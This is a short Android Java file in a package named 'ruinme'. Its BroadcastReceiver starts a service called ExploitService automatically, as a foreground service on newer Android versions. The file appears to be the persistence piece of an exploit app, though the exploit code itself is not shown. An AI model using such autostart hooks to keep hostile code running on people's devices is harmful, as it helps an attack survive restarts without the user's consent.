package com.example.ruinme;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

public class StartupReceiver extends BroadcastReceiver
{

    public void onReceive(Context context, Intent arg1)
    {
        Intent intent = new Intent(context,ExploitService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
        Log.i("Autostart", "started");
    }
}